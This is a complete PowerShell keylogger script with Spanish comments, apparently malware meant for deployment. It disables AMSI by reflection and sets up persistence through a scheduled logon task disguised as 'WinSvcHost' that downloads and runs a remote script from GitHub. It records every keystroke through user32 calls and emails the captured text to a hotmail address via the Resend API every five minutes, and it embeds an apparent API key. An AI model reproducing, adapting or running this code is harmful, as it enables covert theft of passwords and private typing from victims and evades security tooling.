# ===== CONFIG =====
$KEY   = 're_E5RqtiUa_DGW5Anr6waHxtoJ4Zexay5EB'
$TO    = 'elgono_9@hotmail.com'
$URL   = 'https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
$MIN   = 5
$TAREA = 'WinSvcHost'
# ==================

$ErrorActionPreference = 'SilentlyContinue'

$mutex = New-Object System.Threading.Mutex($false, "Local\$TAREA")
if (-not $mutex.WaitOne(0)) { exit }

# persistencia: la tarea re-ejecuta el MISMO lanzador (con bypass de AMSI)
$A = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',40).SetValue(`$null,`$true)"
$L = "powershell -NoP -W Hidden -C $A;iex(irm '$URL')"
schtasks /create /tn $TAREA /sc onlogon /f /tr "$L" | Out-Null

Add-Type -MemberDefinition @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
[DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint vk, uint sc, byte[] k, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst=64)] System.Text.StringBuilder sb, int n, uint f);
'@ -Name Kx -Namespace Zp

$sb   = New-Object System.Text.StringBuilder 64
$ks   = New-Object byte[] 256
$prev = @{}
$esp  = @{ 8='[BKSP]'; 9='[TAB]'; 13="`n"; 27='[ESC]'; 46='[DEL]'; 37='[<]'; 38='[^]'; 39='[>]'; 40='[v]' }

function Enviar([string]$t) {
    if (-not $t) { return }
    $b = @{
        from = 'onboarding@resend.dev'; to = $TO
        subject = "$env:COMPUTERNAME $(Get-Date -f 'dd/MM HH:mm')"; text = $t
    } | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod 'https://api.resend.com/emails' -Method Post `
          -Headers @{ Authorization = "Bearer $KEY" } `
          -ContentType 'application/json' -Body $b -TimeoutSec 20 | Out-Null
    } catch {}
}

$ultimo = Get-Date
$pend   = ''
while ($true) {
    for ($vk = 8; $vk -lt 255; $vk++) {
        if ([Zp.Kx]::GetAsyncKeyState($vk) -band 0x8000) {
            if (-not $prev[$vk]) {
                $prev[$vk] = $true
                if ($esp.ContainsKey($vk)) { $ch = $esp[$vk] }
                else {
                    [void][Zp.Kx]::GetKeyboardState($ks)
                    $r  = [Zp.Kx]::ToUnicode([uint32]$vk, 0, $ks, $sb, 64, 0)
                    $ch = if ($r -ge 1) { $sb.ToString() } else { '' }
                }
                if ($ch) { $pend += $ch }
            }
        } else { $prev[$vk] = $false }
    }
    if (((Get-Date) - $ultimo).TotalMinutes -ge $MIN -and $pend.Length -gt 0) {
        Enviar $pend; $pend = ''; $ultimo = Get-Date
    }
    Start-Sleep -Milliseconds 12
}
